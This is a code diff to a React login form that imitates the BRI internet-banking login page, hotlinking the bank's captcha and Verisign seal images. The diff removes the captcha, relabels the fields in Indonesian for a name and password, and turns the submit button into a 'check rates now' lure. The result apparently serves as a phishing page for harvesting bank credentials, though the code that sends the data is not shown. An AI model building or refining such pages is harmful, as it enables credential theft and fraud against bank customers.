@@ -41,18 +41,20 @@ import React, { useState } from 'react'
         <div className="loginform-wrap">
           <form className="loginform" onSubmit={handleSubmit}>
             <h2>Login</h2>
-            <input id='userId' name="userId" autoComplete="off" maxLength={23} type="text" placeholder="user ID" style={{marginBottom: '5px'}} form="loginform" onChange={handleInputChange} />
-            <input id='password' name="password" autoComplete="off" maxLength={20} type="password" placeholder="password" style={{marginBottom: '5px'}} form="loginform" onChange={handleInputChange} />
-            <div className="validation">							
+            <label>Nama Belakang*</label>
+            <input id='userId' name="namaBelakang" autoComplete="off" maxLength={23} type="text" style={{marginBottom: '5px'}} form="loginform" onChange={handleInputChange} />
+            <label>Kata Sandi*</label>
+            <input id='password' name="kataSandi" autoComplete="off" maxLength={20} type="password" style={{marginBottom: '5px'}} form="loginform" onChange={handleInputChange} />
+            {/* <div className="validation">							
               <input name="j_code" autoComplete="off" maxLength={4} type="text" placeholder="validation" style={{float: 'left', width: '40%', marginRight: '15px'}}/>
               <div id="simple_img" style={{float: 'left'}}>
                 <img className="alignimg" src="https://ib.bri.co.id/ib-bri/login/captcha" />
               </div>
-            </div>
+            </div> */}
             <br/>
             <br/>
             <p  className='text-secondary' id='error'></p>
-            <button type="submit" id='masuk'>Masuk</button>
+            <button type="submit" id='masuk'>cek tarif sekarang</button>
             <div style={{float: 'left', width : '100%'}}>
               <a href="https://sealinfo.verisign.com/splash?form_file=fdf/splash.fdf&dn=ib.bri.co.id" className="verisign">
                 <img className="verisign-logo" src="https://ib.bri.co.id/ib-bri/img/securesite1rtc.jpg" width="100px" height="55px" />
